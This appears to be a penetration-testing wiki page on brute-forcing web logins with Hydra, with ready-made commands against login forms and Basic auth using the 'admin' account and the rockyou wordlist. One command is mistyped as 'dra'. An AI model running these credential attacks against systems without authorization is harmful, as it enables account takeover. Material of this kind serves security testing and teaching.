# Brute-Force

## Theory

We may attempt to brute-force a web service as we may not be able to fully interact with it without credentials. Most web services come with a default user account such as **admin** and may use [common, default, weak or leaked passwords](../../../redteam/delivery/passwd/default-weak-and-leaked-passwords.md).&#x20;

For our brute-force attack, it will dramatically increase our chances of success and reduce the expected duration of our attack. We even may [generate our own wordlist](../../../redteam/delivery/passwd/generate-wordlists.md) for this purpose.

## Practice

{% tabs %}
{% tab title="Authentication Forms" %}
We can use Hydra to perform such attack on HTTP/HTTPS forms. We might use following methods:

* **http-get-form,** in case of an http page with a get form
* **https-get-form**, in case of an https page with a get form
* **http-post-form**, in case of an http page with a post form
* **https-post-form**, in case of an https page with a post form

This methods take parameters in the following format

```
<Path_To_Login_Form>:<Post_Data>:<Incorrect/Correct_String_Params>
```

```bash
# -l : username
# -P : password list
# http(s)-*-form : "<Path_To_Login_Form>:<Post_Data>:<Incorrect_String>
# -s : Specify a port 

# Find on error
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=^USER^&password=^PASS^:Login failed"
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 <IP> http-post-form "/login.php:user=^USER^&password=^PASS^:Login failed"

# Find on success
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> https-post-form "/login.php:user=^USER^&password=^PASS^:S=302"
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get-form "/login.php:user=^USER^&password=^PASS^:S=Success!"
```
{% endtab %}

{% tab title="Basic Auth" %}
We can use Hydra to perform such attack on HTTP/HTTPS websites using Basic auth. We might use following methods:

* **http-get,** in case of an http page with basic auth.
* **https-get**, in case of an https page with with basic auth.

```bash
# -l : username
# -P : password list
# http(s)-get : "<Path_To_Protected_Page>"
# -s : Specify a port 

# HTTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get "/page_url"
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 <IP> http-get "/page_url"

# HTTPS
dra -l admin -P /usr/share/wordlists/rockyou.txt <IP> https-get "/page_url"
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 4434 <IP> https-get "/page_url"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://owasp.org/www-community/attacks/Brute_force_attack" %}

{% embed url="https://github.com/gnebbia/hydra_notes" %}
